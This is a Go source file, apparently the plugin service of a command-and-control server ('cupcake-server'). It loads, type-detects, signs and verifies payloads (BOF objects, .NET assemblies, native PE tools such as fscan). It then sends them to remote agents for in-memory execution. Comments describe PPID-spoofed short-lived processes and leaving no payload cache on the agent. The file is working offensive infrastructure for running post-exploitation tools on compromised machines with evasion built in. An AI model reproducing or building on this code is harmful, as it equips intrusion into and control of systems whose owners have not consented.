package services

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/google/uuid"

	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/store"
	"cupcake-server/pkg/trustchain"
)

var (
	manifestMutex  sync.Mutex
	cachedManifest []PluginMetadata
	manifestLoaded bool
	pluginCache    = make(map[string][]byte)
)

// DetectPluginExecType infers deploy type from file bytes (and optional filename).
// Returns: native-exec | execute-assembly | bof-exec
func DetectPluginExecType(data []byte, filename string) string {
	name := strings.ToLower(filename)
	// Extension hints (weak — content wins)
	extHint := ""
	if strings.HasSuffix(name, ".o") || strings.HasSuffix(name, ".obj") || strings.HasSuffix(name, ".coff") {
		extHint = "bof-exec"
	}

	if len(data) >= 2 && data[0] == 'M' && data[1] == 'Z' {
		if peIsDotNet(data) {
			return "execute-assembly"
		}
		return "native-exec"
	}

	// COFF / BOF: no MZ, IMAGE_FILE_MACHINE_AMD64 (0x8664) or I386 (0x14c)
	if len(data) >= 20 {
		machine := binary.LittleEndian.Uint16(data[0:2])
		sections := binary.LittleEndian.Uint16(data[2:4])
		if (machine == 0x8664 || machine == 0x14c) && sections > 0 && sections < 100 {
			return "bof-exec"
		}
	}

	if extHint != "" {
		return extHint
	}
	// Safe default for unknown blobs: treat as native PE attempt only if large enough
	if len(data) > 64 {
		return "native-exec"
	}
	return "native-exec"
}

func peIsDotNet(data []byte) bool {
	if len(data) < 0x40 {
		return false
	}
	// e_lfanew
	lfanew := int(binary.LittleEndian.Uint32(data[0x3c:0x40]))
	if lfanew <= 0 || lfanew+0x18+96 > len(data) {
		return false
	}
	if string(data[lfanew:lfanew+4]) != "PE\x00\x00" {
		return false
	}
	// COFF header is 20 bytes after PE sig; optional header follows
	optOff := lfanew + 4 + 20
	if optOff+2 > len(data) {
		return false
	}
	magic := binary.LittleEndian.Uint16(data[optOff : optOff+2])
	var clrDirOff int
	switch magic {
	case 0x10b: // PE32
		// DataDirectory starts at optional+96; COM descriptor is index 14 → offset 96+14*8
		clrDirOff = optOff + 96 + 14*8
	case 0x20b: // PE32+
		// DataDirectory at optional+112; COM at 112+14*8
		clrDirOff = optOff + 112 + 14*8
	default:
		// Fallback: search for CLR metadata signature "BSJB"
		return bytesContains(data, []byte("BSJB"))
	}
	if clrDirOff+8 > len(data) {
		return bytesContains(data, []byte("BSJB"))
	}
	va := binary.LittleEndian.Uint32(data[clrDirOff : clrDirOff+4])
	sz := binary.LittleEndian.Uint32(data[clrDirOff+4 : clrDirOff+8])
	if va != 0 && sz != 0 {
		return true
	}
	return bytesContains(data, []byte("BSJB"))
}

func bytesContains(hay, needle []byte) bool {
	if len(needle) == 0 || len(hay) < len(needle) {
		return false
	}
	for i := 0; i+len(needle) <= len(hay); i++ {
		ok := true
		for j := 0; j < len(needle); j++ {
			if hay[i+j] != needle[j] {
				ok = false
				break
			}
		}
		if ok {
			return true
		}
	}
	return false
}

// PluginMetadata matches the manifest.json structure
type PluginMetadata struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Description string `json:"description"`
	FileName    string `json:"file_name"`
	Type        string `json:"type"` // "execute-assembly", "native-exec", "powershell", "memfd-exec", etc.
	Category    string `json:"category"`
	RequiredOS  string `json:"required_os"`
	// Hash is lowercase hex SHA-256 of the plugin file bytes (trust chain).
	Hash string `json:"hash,omitempty"`
	// Cryptographic trust fields (HMAC package signature).
	Version    string `json:"version,omitempty"`
	Signature  string `json:"signature,omitempty"`
	Signer     string `json:"signer,omitempty"`
	ABIVersion int    `json:"abi_version,omitempty"`
	Target     string `json:"target,omitempty"`
	Params     []interface{} `json:"params"`
}

// pluginRollback is process-wide anti-rollback for signed plugins.
var pluginRollback = trustchain.NewRollbackGuard()

// GetTrustKey resolves the HMAC key for a signer (see trustchain.HMACKeyForSigner).
func GetTrustKey(signer string) []byte {
	return trustchain.HMACKeyForSigner(signer)
}

func allowUnsignedPlugin() bool {
	return os.Getenv("CUPCAKE_ALLOW_UNSIGNED_PLUGIN") == "1" ||
		os.Getenv("CUPCAKE_TRUST_REQUIRE_SIG") == "0"
}

// VerifyPluginTrust runs hash integrity then package signature + anti-rollback.
//
//  1. VerifyPluginHash
//  2. Empty Signature → error unless CUPCAKE_ALLOW_UNSIGNED_PLUGIN=1 or CUPCAKE_TRUST_REQUIRE_SIG=0
//  3. trustchain.Verify with GetTrustKey(signer)
//  4. RollbackGuard CheckAndCommit(plugin id, version)
//
// Signed packages require a non-empty Version.
func VerifyPluginTrust(meta *PluginMetadata, fileBytes []byte) error {
	if meta == nil {
		return fmt.Errorf("nil plugin metadata")
	}
	if err := VerifyPluginHash(meta, fileBytes); err != nil {
		return err
	}
	sig := strings.TrimSpace(meta.Signature)
	if sig == "" {
		if allowUnsignedPlugin() {
			log.Printf("[plugin] warning: unsigned plugin allowed via env for %s", meta.ID)
			return nil
		}
		return fmt.Errorf("plugin signature missing: refuse deploy (set CUPCAKE_ALLOW_UNSIGNED_PLUGIN=1 or CUPCAKE_TRUST_REQUIRE_SIG=0 for lab)")
	}
	ver := strings.TrimSpace(meta.Version)
	if ver == "" {
		return fmt.Errorf("plugin version missing: signed packages require version (refuse empty)")
	}
	// Prefer on-disk hash (already matched) for the signed payload field.
	sha := strings.ToLower(strings.TrimSpace(meta.Hash))
	if sha == "" {
		sha = PluginFileSHA256(fileBytes)
	}
	signer := strings.TrimSpace(meta.Signer)
	if signer == "" {
		signer = "default"
	}
	pm := trustchain.PackageMeta{
		ModuleID:   meta.ID,
		Version:    ver,
		SHA256:     sha,
		Target:     meta.Target,
		ABIVersion: meta.ABIVersion,
		Signer:     signer,
		Signature:  sig,
	}
	key := GetTrustKey(signer)
	if err := trustchain.Verify(pm, key); err != nil {
		return fmt.Errorf("plugin signature verify failed: %w", err)
	}
	if err := pluginRollback.CheckAndCommit(meta.ID, ver); err != nil {
		return err
	}
	return nil
}

// SignPluginMetadata fills Signature (and default Signer) when a trust key is available.
// No-op when no key is configured. Returns error only if Sign itself fails with a key present.
func SignPluginMetadata(meta *PluginMetadata, fileBytes []byte) error {
	if meta == nil {
		return fmt.Errorf("nil plugin metadata")
	}
	if strings.TrimSpace(meta.Hash) == "" && len(fileBytes) > 0 {
		meta.Hash = PluginFileSHA256(fileBytes)
	}
	signer := strings.TrimSpace(meta.Signer)
	if signer == "" {
		signer = "default"
	}
	key := GetTrustKey(signer)
	if len(key) == 0 {
		return nil
	}
	meta.Signer = signer
	if strings.TrimSpace(meta.Version) == "" {
		meta.Version = "0.0.1"
	}
	pm := trustchain.PackageMeta{
		ModuleID:   meta.ID,
		Version:    meta.Version,
		SHA256:     strings.ToLower(strings.TrimSpace(meta.Hash)),
		Target:     meta.Target,
		ABIVersion: meta.ABIVersion,
		Signer:     signer,
	}
	sig, err := trustchain.Sign(pm, key)
	if err != nil {
		return err
	}
	meta.Signature = sig
	return nil
}

// ResetPluginRollbackForTest clears anti-rollback state (unit tests only).
func ResetPluginRollbackForTest() {
	pluginRollback.Reset()
}

// PluginFileSHA256 returns lowercase hex SHA-256 of data.
func PluginFileSHA256(data []byte) string {
	sum := sha256.Sum256(data)
	return hex.EncodeToString(sum[:])
}

// VerifyPluginHash checks that fileBytes match the manifest Hash.
// Fail-closed: empty Hash is rejected unless CUPCAKE_ALLOW_LEGACY_PLUGIN_HASH=1
// is set (lab / migration only). Production deploys must pin SHA-256 digests.
func VerifyPluginHash(meta *PluginMetadata, fileBytes []byte) error {
	if meta == nil {
		return fmt.Errorf("nil plugin metadata")
	}
	want := strings.ToLower(strings.TrimSpace(meta.Hash))
	if want == "" {
		if os.Getenv("CUPCAKE_ALLOW_LEGACY_PLUGIN_HASH") == "1" {
			log.Printf("[plugin] warning: empty hash allowed via CUPCAKE_ALLOW_LEGACY_PLUGIN_HASH for %s", meta.ID)
			return nil
		}
		return fmt.Errorf("plugin hash missing: refuse deploy without SHA-256 (set CUPCAKE_ALLOW_LEGACY_PLUGIN_HASH=1 only for legacy lab migration)")
	}
	got := PluginFileSHA256(fileBytes)
	if got != want {
		return fmt.Errorf("plugin hash mismatch: expected %s got %s", want, got)
	}
	return nil
}

// loadPluginManifestNoLock reads from disk without locking - internal use only
func loadPluginManifestNoLock() ([]PluginMetadata, error) {
	if manifestLoaded {
		return cachedManifest, nil
	}

	data, err := os.ReadFile("assets/plugins/manifest.json")
	if err != nil {
		return nil, fmt.Errorf("failed to read plugin manifest: %v", err)
	}

	var plugins []PluginMetadata
	if err := json.Unmarshal(data, &plugins); err != nil {
		return nil, fmt.Errorf("failed to parse plugin manifest: %v", err)
	}

	cachedManifest = plugins
	manifestLoaded = true
	return plugins, nil
}

// LoadPluginManifest reads the metadata from assets/plugins/manifest.json (Locked)
func LoadPluginManifest() ([]PluginMetadata, error) {
	manifestMutex.Lock()
	defer manifestMutex.Unlock()
	return loadPluginManifestNoLock()
}

// DeployPlugin sends a plugin **payload** (BOF object / .NET assembly) to the agent.
// For reverse/forward minimal agents, ensures L2 runtime module (bof / dotnet) is
// staged first — plugins folder holds payloads; storage/modules holds engines.
func DeployPlugin(agentID string, pluginID string, args string) (string, error) {
	// 1. 获取客户端与锁
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return "", fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	// 2. 获取插件配置
	manifest, err := LoadPluginManifest()
	if err != nil {
		return "", err
	}

	var meta *PluginMetadata
	for _, p := range manifest {
		if p.ID == pluginID {
			meta = &p
			break
		}
	}

	if meta == nil {
		return "", fmt.Errorf("plugin %s not found", pluginID)
	}

	// 3. 读取插件文件（载荷：.o BOF / .NET assembly / 工具二进制）
	manifestMutex.Lock()
	binData, ok := pluginCache[pluginID]
	manifestMutex.Unlock()

	if !ok {
		pluginPath := filepath.Join("assets/plugins", meta.FileName)
		var err error
		binData, err = os.ReadFile(pluginPath)
		if err != nil {
			return "", fmt.Errorf("failed to read plugin: %v", err)
		}
		manifestMutex.Lock()
		pluginCache[pluginID] = binData
		manifestMutex.Unlock()
	}

	// Trust chain: hash integrity + HMAC signature + anti-rollback.
	if err := VerifyPluginTrust(meta, binData); err != nil {
		// Drop poisoned cache entry
		manifestMutex.Lock()
		delete(pluginCache, pluginID)
		manifestMutex.Unlock()
		return "", fmt.Errorf("plugin integrity check failed: %w", err)
	}

	// Always re-detect from file content (ignore wrong manual type in manifest)
	pType := DetectPluginExecType(binData, meta.FileName)
	if pType != strings.ToLower(strings.TrimSpace(meta.Type)) {
		log.Printf("[Plugin] type auto-detect: manifest=%q → content=%q for %s", meta.Type, pType, meta.FileName)
	}

	// 3b. BOF/.NET 隔离宿主；原生 PE 不需要 iso_host（自身即进程）
	switch pType {
	case "bof-exec", "bof":
		if err := EnsureHeavyRuntimeModule(agentID, "bof"); err != nil {
			log.Printf("[Plugin] ensure L2 module bof for %s: %v (will still try deploy)", agentID, err)
		}
	case "execute-assembly", "dotnet", "execute_assembly":
		if err := EnsureHeavyRuntimeModule(agentID, "dotnet"); err != nil {
			log.Printf("[Plugin] ensure L2 module dotnet for %s: %v (will still try deploy)", agentID, err)
		}
	}

	// 4. 载荷：每次完整下发
	cmdType := "shell"
	content := args
	b64Data := base64.StdEncoding.EncodeToString(binData)

	switch pType {
	case "execute-assembly", "dotnet", "execute_assembly":
		// .NET 程序集 → 隔离宿主 CLR
		cmdType = "execute_assembly"
		content = args
	case "bof-exec", "bof":
		cmdType = "bof_exec"
		content = base64.StdEncoding.EncodeToString([]byte(args))
	case "native-exec", "native-pe", "native", "pe-exec", "exe":
		// fscan 等原生 PE：PPID 伪装短命进程 + 参数，短时落盘后删除（非注入）
		cmdType = "native_exec"
		content = args
	case "memfd-exec", "linux-script", "shellcode-inject":
		return "", fmt.Errorf("plugin type %q not supported (injection removed); use native-exec for PE tools", meta.Type)
	default:
		// 误配时不要静默变成 shell + 裸参数（会变成 spawn '-h'）
		return "", fmt.Errorf(
			"unknown plugin type %q — use native-exec (fscan 等原生 exe)、execute-assembly (.NET)、bof-exec (BOF)",
			meta.Type,
		)
	}

	// 不在 Agent 上标记 CachedPlugins — 用完即焚，下次再下发
	client.PluginMutex.Lock()
	if client.CachedPlugins != nil {
		delete(client.CachedPlugins, pluginID)
	}
	client.PluginMutex.Unlock()

	// 5. 封装并发送
	reqID := uuid.New().String()
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    cmdType,
			CommandContent: content,
			Data:           b64Data,
			ReqID:          reqID,
		},
	}

	log.Printf("[Plugin] Running payload %s (%s) on %s (in-memory, no agent payload cache), Args: %s", meta.Name, cmdType, agentID, args)

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return "", err
	}

	// Do NOT auto-unload iso_host after a fixed timer.
	// Old 3s unload raced with long BOF/CLR jobs and concurrent plugins
	// ("iso_host PE missing" mid-flight). Host process itself burns the
	// temp PE on exit; staged PE in agent memory is reusable until operator
	// unloads or agent dies. Optional explicit unload: module_unload iso_host.

	_ = store.CreateCommandLog(agentID, reqID, meta.Name, fmt.Sprintf("Args: %s", args))
	return reqID, nil
}

// AddPluginToManifest appends new plugin metadata to manifest.json
func AddPluginToManifest(plugin PluginMetadata) error {
	manifestMutex.Lock()
	defer manifestMutex.Unlock()

	manifest, err := loadPluginManifestNoLock()
	if err != nil {
		manifest = []PluginMetadata{}
	}

	// Double check for duplicate ID
	for _, p := range manifest {
		if p.ID == plugin.ID {
			return fmt.Errorf("plugin with ID %s already exists", plugin.ID)
		}
	}

	manifest = append(manifest, plugin)
	
	data, err := json.MarshalIndent(manifest, "", "  ")
	if err != nil {
		return err
	}

	err = os.WriteFile("assets/plugins/manifest.json", data, 0644)
	if err == nil {
		cachedManifest = manifest
		manifestLoaded = true
	}
	return err
}

// RemovePluginFromManifest removes plugin metadata from manifest.json
func RemovePluginFromManifest(pluginID string) (string, error) {
	manifestMutex.Lock()
	defer manifestMutex.Unlock()

	manifest, err := loadPluginManifestNoLock()
	if err != nil {
		return "", err
	}

	var updated []PluginMetadata
	var fileName string
	found := false

	for _, p := range manifest {
		if p.ID == pluginID {
			fileName = p.FileName
			found = true
			continue
		}
		updated = append(updated, p)
	}

	if !found {
		return "", fmt.Errorf("plugin with ID %s not found", pluginID)
	}

	data, err := json.MarshalIndent(updated, "", "  ")
	if err != nil {
		return "", err
	}

	if err := os.WriteFile("assets/plugins/manifest.json", data, 0644); err != nil {
		return "", err
	}
	
	cachedManifest = updated
	manifestLoaded = true
	delete(pluginCache, pluginID)

	return fileName, nil
}
